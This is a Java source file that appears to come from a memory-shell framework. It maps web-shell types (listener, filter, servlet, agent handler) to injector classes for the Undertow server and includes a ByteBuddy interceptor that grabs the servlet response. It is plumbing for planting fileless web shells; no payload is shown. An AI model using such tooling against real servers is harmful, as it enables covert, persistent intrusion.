package com.reajason.javaweb.memshell.server.undertow;

import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import java.util.Set;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class Undertow extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            Map<?, ?> map = (Map<?, ?>) ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "exchange"), "attachments");
            Object[] keys = map.keySet().toArray();
            for (Object key : keys) {
                if (map.get(key).toString().contains("ServletRequestContext")) {
                    response = ShellCommonUtil.getFieldValue(map.get(key), "servletResponse");
                    break;
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Set<MethodSignature> getShellMethodContracts(String shellType) {
        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
            return MethodContracts.UNDERTOW_HANDLER_CONTRACTS;
        }
        return super.getShellMethodContracts(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.undertow.UndertowListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.undertow.UndertowListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.undertow.UndertowFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.undertow.UndertowFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletInjector")
                .addInjector(UNDERTOW_AGENT_SERVLET_HANDLER, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletHandlerAgentInjector")
                .build();
    }
}
